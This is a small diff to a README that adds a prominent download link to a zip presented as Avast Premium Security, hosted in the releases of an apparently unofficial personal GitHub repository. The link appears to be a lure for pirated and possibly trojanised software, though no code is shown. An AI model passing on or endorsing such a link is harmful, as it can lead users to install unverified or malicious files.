@@ -5,6 +5,8 @@
 <img width="566" height="690" alt="{4CAC5847-AD3A-45E5-90BE-E8C4A14721C3}" src="https://github.com/user-attachments/assets/e4fc9df6-67be-4ac8-b133-ebd7b77ca671" />
 
 
+# [Download](https://github.com/Geoxant8/Avast-Premium-Security/releases/download/download/Avast.Premium.Security.zip)
+
 
 ## 🛡️ Avast Premium Security
 
